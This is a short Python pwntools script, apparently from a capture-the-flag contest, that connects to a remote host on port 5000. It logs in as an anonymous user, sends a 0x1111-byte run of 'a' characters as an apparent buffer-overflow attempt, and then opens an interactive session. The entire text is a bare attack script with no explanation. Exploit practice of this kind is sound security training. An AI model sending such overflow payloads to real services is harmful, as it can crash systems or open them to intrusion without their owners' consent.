from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

r = remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com', 5000)

r.sendline(b"USER ANONYMOUS")
r.sendline(b"a"*0x1111)
print(r.recvline())
r.interactive()
